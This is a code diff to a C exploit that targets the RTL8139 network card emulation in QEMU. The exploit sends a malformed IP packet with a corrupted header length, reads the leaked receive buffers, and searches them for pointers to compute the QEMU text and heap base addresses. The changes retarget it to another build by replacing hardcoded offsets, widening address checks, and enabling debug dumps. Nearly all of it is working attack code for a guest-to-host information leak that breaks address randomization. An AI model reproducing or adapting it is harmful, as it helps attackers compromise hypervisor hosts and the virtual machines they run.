@@ -46,7 +46,7 @@ POSSIBILITY OF SUCH DAMAGE.
 #include <string.h>
 #include <unistd.h>
 
-#include "qemu.h"
+//#include "qemu.h"
 
 #define PAGE_SHIFT      12
 #define PAGE_SIZE       (1 << PAGE_SHIFT)
@@ -113,8 +113,8 @@ enum RT8139_ChipCmdBits {
 enum RTL_8139_CplusCmdBits {
 	CPlusRxVLAN   = 0x0040, /* enable receive VLAN detagging */
 	CPlusRxChkSum = 0x0020, /* enable receive checksum offloading */
-	CPlusRxEnb    = 0x0002,
-	CPlusTxEnb    = 0x0001,
+	CPlusRxEnb    = 0x0002,/*Receive Enable in c+ mod*/
+	CPlusTxEnb    = 0x0001,/*Transmit Enable in c+ mod*/
 };
 
 enum RTL_8139_tx_config_bits {
@@ -149,8 +149,8 @@ struct rtl8139_ring {
 
 /* malformed ip packet with corrupted header size */
 static uint8_t rtl8139_packet [] = {
-	0x52, 0x54, 0x00, 0x12, 0x34, 0x56, 0x52, 0x54, 0x00, 0x12, 0x34,
-	0x56, 0x08, 0x00, 0x45, 0x00, 0x00, 0x13, 0xde, 0xad, 0x40, 0x00,
+	0x52, 0x54, 0x00, 0x12, 0x34, 0x57, 0x52, 0x54, 0x00, 0x12, 0x34,
+	0x57, 0x08, 0x00, 0x45, 0x00, 0x00, 0x13, 0xde, 0xad, 0x40, 0x00,
 	0x40, 0x06, 0xde, 0xad, 0xc0, 0x08, 0x01, 0x01, 0xc0, 0xa8, 0x01,
 	0x02, 0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe, 0xca, 0xfe,
 	0xba, 0xbe, 0x50, 0x10, 0xde, 0xad, 0xde, 0xad, 0x00, 0x00
@@ -234,30 +234,54 @@ uint64_t searchTextBase(void *ptr, size_t size)
 {
 	size_t i;
 	int j;
+	int g;
+	int tmp;
+	uint64_t tmp_ret;
 	uint64_t value;
 	bool flag = 0;
-	uint64_t property_get_str_offset = 0x399982;
-       	uint64_t ans = 0;
+	//uint64_t property_get_str_offset = 0x399982;
+    uint64_t guess[2] = {0x76c160, 0x70e200};
+	uint64_t ans = 0;
 	// 0x55fa0da60982
 	for (i = 0; i < size-8; i += 8)
 	{
-		value = 0;
-		for ( j = 0; j < 8; j++)
+		for(g=0; g<2; g++)
 		{
-			uint64_t t = *(uint8_t*)(ptr + i + j);
-			value += (t << (j*8));
-		}
-		if( ((value & 0xfffff00000000000) == 0x500000000000) 
-		&& (( (value - property_get_str_offset) & 0xfff) == 0) )
-		{
-			flag = 1;
-			//printf("0x%llx\n", value);
-			break;
+			value = 0;
+			for ( j = 0; j < 8; j++)
+			{
+				uint64_t t = *(uint8_t*)(ptr + i + j);
+				value += (t << (j*8));
+			}
+			if( (((value & 0xfffff00000000000) == 0x500000000000) || ((value & 0xfffff00000000000) == 0x600000000000))
+			&& (( (value - guess[g]) & 0xfff) == 0) )
+			{
+				flag = 1;
+				//printf("0x%llx\n", value);
+				tmp = g;
+				tmp_ret = value;
+				break;
+			}
+			value = 0;
+			for ( j = 4; j < 12; j++)
+			{
+				uint64_t t = *(uint8_t*)(ptr + i + j);
+				value += (t << (j*8));
+			}
+			if( (((value & 0xfffff00000000000) == 0x500000000000) || ((value & 0xfffff00000000000) == 0x600000000000))
+			&& (( (value - guess[g]) & 0xfff) == 0) )
+			{
+				flag = 1;
+				//printf("0x%llx\n", value);
+				tmp = g;
+				tmp_ret = value;
+				break;
+			}
 		}
 	}
 	if(flag){
 		//xxd(ptr, RTL8139_BUFFER_SIZE);
-		ans = value - property_get_str_offset;
+		ans = tmp_ret - guess[tmp];
 		printf("Base address of qemu text: 0x%llx\n", ans);
 	}
 	return ans;
@@ -301,7 +325,7 @@ uint64_t searchHeapBase(void *ptr, size_t size, uint64_t textBase)
 	int j;
 	uint64_t value, ans = 0;
 	bool flag = 0;
-	uint64_t target_offset[4] = {0xb1f80, 0x11a3dc8, 0x14a31c0, 0x14fb60};
+	uint64_t target_offset[6] = {0x66ea0, 0xab778, 0xeb4930, 0xe25358, 0x40eb0, 0xea1688};
 	for (i = 0; i < size-8; i += 8)
 	{
 		value = 0;
@@ -312,7 +336,47 @@ uint64_t searchHeapBase(void *ptr, size_t size, uint64_t textBase)
 		}
 		if((value & 0xffff00000000) == (textBase & 0xffff00000000) && value!=0)
 		{	
-			if( (value - textBase) > 0xde2000)
+			if( (value - textBase) > 0x691000)
+			{				
+			    for(j = 0; j < 6; j++)
+			    {
+				    if(((value -target_offset[j])&0xfff) == 0 && !flag){
+					    ans = value -target_offset[j];
+					    flag = 1;
+					    break;
+				    }
+			    }
+			}
+		}
+		value = 0;
+		for ( j = 4; j < 12; j++)
+		{
+			uint64_t t = *(uint8_t*)(ptr + i + j);
+			value += (t << (j*8));
+		}
+		if((value & 0xffff00000000) == (textBase & 0xffff00000000) && value!=0)
+		{	
+			if( (value - textBase) > 0x691000)
+			{				
+			    for(j = 0; j < 6; j++)
+			    {
+				    if(((value -target_offset[j])&0xfff) == 0 && !flag){
+					    ans = value -target_offset[j];
+					    flag = 1;
+					    break;
+				    }
+			    }
+			}
+		}
+		value = 0;
+		for ( j = 8; j < 16; j++)
+		{
+			uint64_t t = *(uint8_t*)(ptr + i + j);
+			value += (t << (j*8));
+		}
+		if((value & 0xffff00000000) == (textBase & 0xffff00000000) && value!=0)
+		{	
+			if( (value - textBase) > 0x691000)
 			{				
 			    for(j = 0; j < 4; j++)
 			    {
@@ -357,6 +421,8 @@ void rtl8139_desc_config_tx(struct rtl8139_desc *desc, void *buffer)
 	desc->buf_lo = addr;
 
 	addr = (uint32_t)gva_to_gpa(desc);
+
+	printf("[-] phys addr of TxRing is: %p\n", addr);
 	outl(addr, RTL8139_PORT + TxAddr0);
 	outl(0x0, RTL8139_PORT + TxAddr0 + 0x4);
 }
@@ -384,6 +450,8 @@ void rtl8139_desc_config_rx(struct rtl8139_ring *ring,
 	}
 
 	addr = (uint32_t)gva_to_gpa(desc);
+	printf("[-] phys addr of RxRing is: %p\n", addr);
+
 	outl(addr, RTL8139_PORT + RxRingAddrLO);
 	outl(0x0, RTL8139_PORT + RxRingAddrHI);
 }
@@ -438,8 +506,8 @@ int main()
 	uint64_t textBaseAddr = 0;
 	uint64_t phyBaseAddr = 0;
 	uint64_t heapBaseAddr = 0;
-	//for (i = 0; i < rtl8139_rx_nb; i++)
-	//	xxd(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
+	for (i = 0; i < rtl8139_rx_nb; i++)
+		xxd(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
 	for (i = 0; i < rtl8139_rx_nb; i++)
 	{
 		textBaseAddr = searchTextBase(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
@@ -458,5 +526,4 @@ int main()
 		if(heapBaseAddr != 0)
 			break;
 	}
-
 }
